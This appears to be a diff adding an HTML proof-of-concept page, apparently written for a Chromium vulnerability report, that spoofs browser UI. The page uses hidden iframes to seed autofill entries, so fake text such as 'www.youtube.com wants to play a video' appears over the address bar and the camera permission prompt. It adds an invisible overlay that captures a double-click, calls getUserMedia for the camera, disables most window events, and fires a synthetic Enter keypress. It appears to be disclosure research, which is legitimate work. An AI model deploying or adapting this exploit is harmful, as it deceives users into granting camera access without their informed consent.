@@ -1,0 +1,152 @@
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; }
+body { overflow: hidden; }
+iframe.formFrame { width: 1px; height: 1px; opacity: 0.01; }
+#overlayElem { position: absolute; opacity: 0.001; cursor: default; width: 100%; height: calc(100vh - 10px); top: 0px; left: 0; z-index: 5; }
+
+#overlayElem.move { left: 110px; top: 27px; height: calc(100vh - 100px); }
+
+#instructions { text-align: center; margin-top: 200px; font-size: 2em; }
+#instructions.hide { display: none; }
+
+#cookieIcon {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  width: 60px;
+  height: 60px;
+  background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Emoji_u1f36a.svg/512px-Emoji_u1f36a.svg.png'); /* Cookie image URL */
+  background-size: cover;
+  background-position: center;
+  cursor: pointer;
+  z-index: 10;
+}
+</style>
+</head>
+<body>
+<h1>PoC: Autofill over browser UI, permission prompt</h1>
+<h2>More complete spoof which covers address bar, works before crbug.com/1235222 was fixed</h2>
+<p>This requires two clicks in quick succession (to reduce chances of user noticing original text/UI)</p>
+<p>Also uses secondary techniques described in crbug.com/1172533</p>
+<p id="output"></p>
+
+<p id="instructions">Please double-click to play video</p>
+
+<input type="text" id="overlayElem" name="alesandroortiz[uniqueInit2]" autofocus autocomplete="off">
+
+<div id="cookieIcon"></div>
+
+<script>
+const trustedOrigin = 'https://alesandroortiz.com';
+
+var barStatusString = 'noLimits';
+
+var createAutofillEntryViaFrame = (entry) => {
+  var frameElem = document.createElement('iframe');
+  frameElem.classList.add('formFrame');
+  frameElem.addEventListener('load', (event) => {
+    if (event.target.contentWindow.location.search.indexOf('submitted') > -1) {
+      // After form submit, remove frame
+      event.target.remove();
+      return;
+    }
+    event.target.contentWindow.postMessage({"entry": entry, "fieldSuffix": '2'+barStatusString}, trustedOrigin);
+  });
+  document.body.appendChild(frameElem); 
+  frameElem.src = 'autofill-setup-frame.html';
+}
+
+createAutofillEntryViaFrame('https://www.youtube.com/watch?v=aBcDeFgH');
+setTimeout(() => {
+  createAutofillEntryViaFrame('www.youtube.com wants to play a video');
+}, 100);
+
+var disableMostEventsForWindow = () => {
+  // Same technique as PoC from crbug.com/1172533
+  // Disables all events except keydown event
+  // Note: This must be run on window, NOT the input elem
+  for (elemProperty in window) {
+    if (elemProperty.indexOf('on') == 0) {
+       if (elemProperty === 'onmousedown') {
+          // Do nothing
+       } else if (elemProperty === 'onbeforeunload') {
+          // onbeforeunload empty to allow PoC reset without additional browser prompt
+       } else {
+         window[elemProperty] = (event) => {
+           overlayElem.focus();
+           overlayElem.click();
+           return false;
+         }
+       }
+    }
+  }
+}
+
+var isFirstClick = true;
+overlayElem.addEventListener('mousedown', (event) => {
+  if (isFirstClick) {
+    isFirstClick = false;
+    navigator.mediaDevices.getUserMedia({video: true})
+    .catch((e) => {
+      isFirstClick = true; // We cannot proceed, so reset state
+      if (e.message.indexOf('Permission denied') > -1) {
+        instructions.innerText = 'Please reset content settings to Ask';
+      } else {
+        console.error(e);
+        window.location.reload();
+      }
+    });
+    overlayElem.classList.add('move');
+    return;
+  }
+
+  // Delay changing to button until autofill prompt is shown
+  setTimeout(() => { overlayElem.type = 'button'; }, 100);
+
+  // Change input field name and enable autocompletion.
+  // Values are different initially to prevent spurious keyboard input from creating or showing unwanted autofill entries.
+  overlayElem.value = '';
+  overlayElem.name = 'alesandroortiz[unique2'+barStatusString+']';
+  overlayElem.autocomplete = 'on';
+
+  instructions.classList.add('hide');
+
+  disableMostEventsForWindow();
+});
+
+setInterval(() => {
+  // If user clicks autofill value, reset
+  if (overlayElem.value.length > 0) {
+    window.location.reload();
+  }
+}, 100);
+
+var reloadDebounceTimer;
+window.addEventListener('resize', (event) => {
+  clearTimeout(reloadDebounceTimer);
+  reloadDebounceTimer = setTimeout(() => {
+    window.location.reload();
+  }, 300);
+});
+
+// Cookie icon click event
+document.getElementById("cookieIcon").addEventListener('click', function() {
+  // Automatically simulate the Enter key press without user interaction
+  var event = new KeyboardEvent('keydown', {
+    key: 'Enter',
+    code: 'Enter',
+    keyCode: 13,
+    charCode: 13,
+    bubbles: true
+  });
+
+  document.dispatchEvent(event);
+});
+
+</script>
+
+</body>
+</html>
